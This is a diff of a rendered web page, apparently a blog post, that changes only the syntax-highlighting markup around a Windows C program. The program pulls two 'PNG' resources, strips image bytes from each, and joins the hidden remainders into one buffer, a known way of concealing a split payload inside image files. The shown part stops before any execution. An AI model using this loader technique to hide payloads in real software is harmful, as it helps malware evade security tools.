-</span><span class="c1"></span>	<span class="n">BYTE</span><span class="o">*</span> <span class="n">Part1</span> <span class="o">=</span> <span class="n">getResource</span><span class="p">(</span><span class="n">hInstance</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Part1Len</span><span class="p">);</span>
-	<span class="n">BYTE</span><span class="o">*</span> <span class="n">Part2</span> <span class="o">=</span> <span class="n">getResource</span><span class="p">(</span><span class="n">hInstance</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Part2Len</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">Part1Len</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">Part2Len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
-	<span class="n">SIZE_T</span> <span class="n">FSize</span> <span class="o">=</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">Part1Len</span> <span class="o">+</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">Part2Len</span><span class="p">;</span> <span class="c1">//总长度
-</span><span class="c1"></span>	<span class="n">CHAR</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">CHAR</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">FSize</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
-	<span class="c1">//进行合并
-</span><span class="c1"></span>	<span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">Part1</span><span class="p">,</span> <span class="n">Part1Len</span><span class="p">);</span>
-	<span class="n">memcpy</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="n">Part1Len</span><span class="p">,</span> <span class="n">Part2</span><span class="p">,</span> <span class="n">Part2Len</span><span class="p">);</span>
-
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define imgLen 1000 </span><span class="c1">//此处定义原始图片长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">BYTE</span><span class="o">*</span> <span class="nf">getResource</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">INT</span> <span class="n">num</span><span class="p">,</span> <span class="n">DWORD</span><span class="o">*</span> <span class="n">PartLen</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HRSRC</span> <span class="n">ResInfo</span> <span class="o">=</span> <span class="n">FindResourceW</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="sa">L</span><span class="s">&#34;PNG&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">ResInfo</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HGLOBAL</span> <span class="n">ResData</span> <span class="o">=</span> <span class="n">LoadResource</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="n">ResInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="n">ResData</span><span class="p">)</span> <span class="p">{</span> <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">LPVOID</span> <span class="n">lpResData</span> <span class="o">=</span> <span class="n">LockResource</span><span class="p">(</span><span class="n">ResData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">ResSize</span> <span class="o">=</span> <span class="n">SizeofResource</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="n">ResInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">ResSize</span> <span class="o">-</span> <span class="mi">300</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">lpResData</span> <span class="o">+</span> <span class="mi">300</span><span class="p">,</span> <span class="n">ResSize</span> <span class="o">-</span> <span class="mi">300</span><span class="p">);</span> <span class="c1">//这里的300 要对应python 文件中的大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">BYTE</span><span class="o">*</span> <span class="n">data2</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">ResSize</span> <span class="o">-</span> <span class="n">imgLen</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">data2</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">memcpy</span><span class="p">(</span><span class="n">data2</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">,</span> <span class="n">ResSize</span> <span class="o">-</span> <span class="n">imgLen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="n">PartLen</span> <span class="o">=</span> <span class="n">ResSize</span> <span class="o">-</span> <span class="n">imgLen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">data2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">WINAPI</span> <span class="nf">WinMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span><span class="n">HINSTANCE</span> <span class="n">hPrevInstance</span><span class="p">,</span><span class="n">LPSTR</span> <span class="n">lpCmdLine</span><span class="p">,</span><span class="kt">int</span> <span class="n">nShowCmd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">Part1Len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Part2Len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//通过序号读取资源
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">BYTE</span><span class="o">*</span> <span class="n">Part1</span> <span class="o">=</span> <span class="n">getResource</span><span class="p">(</span><span class="n">hInstance</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Part1Len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span><span class="o">*</span> <span class="n">Part2</span> <span class="o">=</span> <span class="n">getResource</span><span class="p">(</span><span class="n">hInstance</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Part2Len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">Part1Len</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">Part2Len</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">SIZE_T</span> <span class="n">FSize</span> <span class="o">=</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">Part1Len</span> <span class="o">+</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">Part2Len</span><span class="p">;</span> <span class="c1">//总长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">CHAR</span><span class="o">*</span> <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">CHAR</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">FSize</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//进行合并
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">Part1</span><span class="p">,</span> <span class="n">Part1Len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">memcpy</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="n">Part1Len</span><span class="p">,</span> <span class="n">Part2</span><span class="p">,</span> <span class="n">Part2Len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 </ol>
